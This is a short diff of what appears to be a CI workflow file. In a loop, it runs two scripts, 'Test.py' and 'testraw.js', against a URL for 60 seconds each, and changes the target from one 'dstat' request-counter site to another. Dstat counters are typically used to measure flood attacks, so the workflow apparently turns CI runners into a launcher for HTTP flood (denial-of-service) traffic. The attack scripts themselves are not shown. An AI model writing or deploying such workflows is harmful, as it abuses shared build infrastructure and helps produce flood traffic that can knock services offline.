@@ -22,7 +22,7 @@ jobs:
           chmod +x Test.py
           PIDS=()
           for i in {1..4}; do
-            timeout 60 python3 Test.py https://ip-count.dstat.uk/ && node testraw.js https://ip-count.dstat.uk/ 60
+            timeout 60 python3 Test.py https://dstatlove.xyz/hit && node testraw.js https://dstatlove.xyz/hit 60
             PIDS+=($!)
           done
           
